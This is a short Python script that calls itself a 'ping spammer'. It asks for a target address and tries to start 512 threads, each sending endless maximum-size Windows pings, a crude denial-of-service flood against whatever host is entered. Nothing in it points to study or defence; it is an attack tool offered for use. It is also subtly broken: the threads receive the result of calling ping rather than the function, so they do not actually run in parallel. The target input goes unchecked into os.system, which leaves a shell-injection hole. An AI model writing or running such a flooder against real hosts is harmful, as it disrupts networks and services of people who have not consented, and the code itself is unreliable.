import os
import threading
def ping(addy):
    os.system(f"ping {addy} -t -l 65500")
print("ping spammer??"+(5000*'[]'))
addy = input("enter target:")
for i in range(512):
    thead = threading.Thread(target=ping(addy),name=f'TH{i}')
    thead.start()
